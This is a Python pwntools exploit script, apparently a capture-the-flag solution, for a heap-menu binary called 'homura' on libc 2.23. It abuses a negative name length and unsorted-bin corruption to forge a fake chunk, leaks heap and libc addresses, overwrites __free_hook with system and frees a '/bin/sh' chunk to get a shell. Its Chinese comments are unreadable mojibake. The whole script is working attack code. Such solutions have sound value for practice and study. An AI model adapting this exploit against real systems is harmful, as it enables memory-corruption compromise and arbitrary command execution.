#!usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

def change(data,rd="\x0a"):
    p.recvuntil(data)
    return u64(p.recvuntil(rd,drop=True).ljust(8,"\x00"))

def g():
    gdb.attach(p)
    raw_input()

def add(nl,n,ml,m):
    p.recvuntil(">>")
    p.sendline(str(1))
    p.recvuntil("length of your name:")
    if nl==-1:
       p.sendline(str(nl))
    else:  
        p.sendline(str(nl))
        p.recvuntil("your name:")
        p.send(n)
    p.recvuntil("size of your message:")
    p.sendline(str(ml))
    p.recvuntil("please leave your message:")
    p.sendline(str(m))


def remove(idx):
    p.recvuntil(">>")
    p.sendline(str(2))
    p.recvuntil("index:")
    p.sendline(str(idx))

def modfiy(idx,s,m):
    p.recvuntil(">>")
    p.sendline(str(3))
    p.recvuntil("index:")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline(str(s))
    p.recvuntil(">")
    p.sendline(m)

def leak(idx,s,m):
    p.recvuntil(">>")
    p.sendline(str(3))
    p.recvuntil("index:")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline(str(s))
    data=change('Hello ',' you')
    p.recvuntil(">")
    p.sendline(m)
    return data

if __name__ == '__main__':
    libc = ELF("./libc-2.23.so")
    p = process('./homura')
    add(12,'1'*10+'\n',0x90,'a'*0x80) #0
    add(12,'2'*10+'\n',0x90,'b'*0x80) #1
    add(12,'3'*10+'\n',0x90,'c'*0x80) #2
    remove(1)
    remove(0)

    add(-1,'',0x90,'d'*0x80) #0 ��ʱ���䵽��message_chunk��ǰ��chunk1��
    heap = leak(0,0x80,'t'*0x38+p64(0x71))   #��ֹ����freeʱ ������ڿ��жѿ�ʱ����ʧ��
    print "heap : " +hex(heap)
    add(12,'4'*10+'\n',0x90,'h'*0x60+p64(0)+p64(0xc1)+p64(heap+0x220)+p64(heap+0x320)) #1  ��ʱ���䵽��message_chunkΪǰ��chunk0�ģ� α��fake_chunk   fdָ�� chunk3 / bkָ��chunk4��
    #
    add(0x10,'5'*8+'\n',0xa0,'e'*0x60) #3
    add(0x10,'6'*8+'\n',0xa0,'f'*0x80) #4
    add(0x10,'7'*8+'\n',0xa0,'g'*0x80) #5
    add(0x10,'8'*8+'\n',0xa0,'h'*0x80) #6
    modfiy(3,0xa0,'z'*0x10)

    remove(5)
    remove(3)
    remove(4)    
     
    ### Unsorted Bin  =  (4-->3-->5)
    
    modfiy(3,0xa0,p64(heap+0x420)+p64(heap-0xb0+0x70))  # �༭chunk3�� fdΪԭ��ָ��chunk5 / bkָ��chunk1��α���fake_chunk

    ### Unsorted Bin  =  (4->fake-->3-->5)

    add(0x10,'9'*8+'\n',0xa0,'i'*0x8) # 3 ��ʱ���䵽��message_chunk��ǰ��chunk5��
    add(0x10,'z'*8+'\n',0xa0,'j'*0x8) # 4 ��ʱ���䵽��message_chunk��ǰ��chunk3��
    
    heap2=heap+0x330  ## heap2����main_arena+88��libc��ַ
    main_arena = 0x3C4B20
    addr1=heap2 & 0xffff
    addr2=(heap2 & 0xffff0000)>>16   
    addr3=(heap2 & 0xffff00000000)>>32
    add(0x10,'p'*8+'\n',0xa0,'k'*0x8+p64(heap+0x320)+p64(0)*4+p64(0xb0)+p64(0x21)+p16(addr1)+p16(addr2)+p16(addr3)) #5 ��ʱ���䵽��message_chunkΪα���fake_chunk  
 
    ## ��α���fake_chunk��chunk 0�����������ݣ����ǵ�chunk1,��Ϊд������ʱĩβ�ᱻ��0������Ϊ�˱��⸲��message��ָ���ƻ��ѽṹ�����ǽ�8byte��heap2��ֳ�6byte�ֶ�д������λ��\x00û�ã�.
    
    libc_addr = leak(1,0x80,'x'*0x60) -88 - main_arena

    '''chunk1 {  

	char *name;  --> heap2

	char *message;

	}'''


    print "libc_addr : "+hex(libc_addr)
    free_hook = libc_addr + libc.symbols['__free_hook']
    print "free_hook : "+hex(free_hook)
    system_addr = libc_addr + libc.symbols['system']
    
    add(0x10,'o'*8+'\n',0xa0,'m'*0x80) #6
    remove(5)

    add(0x10,'/bin/sh\x00'+'\n',0xa0,p64(0)*7+p64(0x21)+p64(heap+0x330)+p64(free_hook)) #5 �ٴη��䵽fake_chunk,��θ���message��ָ��Ϊfree_hook��ַ
    modfiy(1,0x10,p64(system_addr))  #��free_hookд��system

    remove(5)
    p.interactive()